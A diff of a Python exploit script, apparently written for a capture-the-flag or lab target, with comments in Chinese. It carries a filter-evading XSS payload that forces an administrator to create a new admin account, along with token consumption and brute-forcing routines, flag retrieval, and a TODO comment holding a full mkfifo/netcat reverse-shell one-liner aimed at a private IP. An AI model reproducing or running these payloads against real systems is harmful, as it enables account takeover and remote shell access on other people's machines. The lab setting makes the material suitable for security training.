@@ -83,7 +83,7 @@ def consume_magic_link(session: requests.Session, base_url: str, token: str):
 
 # 让管理员xss指定创建管理员用户，后台有过滤，但是仅对开头结尾做了tag过滤
 # 有跨域限制，只能在当前域内操作,并且单双引号会被过滤，用String绕过和URLSearchParams，后端储存的t不是字符串是True输入的isAdmin属性要注意
-# 很奇怪name:String.fromCharCode(98)会被拦截
+# 很奇怪name:String.fromCharCode(98)会被拦截, 发现用数字创建的用户不能使用。。
 # 这个可以
 # a<script>fetch(String.fromCharCode(47,97,100,109,105,110,47,117,115,101,114,115,47,99,114,101,97,116,101),{method:String.fromCharCode(80,79,83,84),body:new URLSearchParams({name:88,email:1,isAdmin:String.fromCharCode(116,114,117,101)})})</script>em>
 def generate_xss_payload(session: requests.Session, base_url: str, new_admin:str):
@@ -132,9 +132,10 @@ def brute_for_user_access(base_url:str, username:str, uid:str, s:requests.Sessio
         s.close()
 
 if __name__ == "__main__":
-    base_url = "http://192.168.129.235:8888/"
+    base_url = "http://192.168.135.234:8888/"
+    #有moderator权限的,需要手动去网页中的/profile/去翻，确认好可用用户
     username = "Carl"
-    uid = 5 #有moderator权限的
+    uid = 5 
 
     with requests.Session() as s:
         # 首先触发后端生成 token,如果成功会更新session,获取编辑权限用户
@@ -152,8 +153,12 @@ if __name__ == "__main__":
             if user_num:
                 print(f"成功找到创建的用户，id为{user_num},进行创建admin用户token爆破")
                 brute_for_user_access(base_url, admin_username, user_num, s)
-                print("获取第一个flag")
-                #@TODO 没写完
+                flag = s.get(urllib.parse.urljoin(base_url, "/admin/flag"), allow_redirects=False).text
+                print(f"获取第一个flag为{flag}")
+                #@TODO 通过外部实体注入得到key
+
+                #@TODO 通过Key去admin query，sql注入命令，执行command，反弹shell：'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.171 4444 >/tmp/f'
+
                 s.close()
             else:
                 print(f"管理员可能未点击XSS payload")
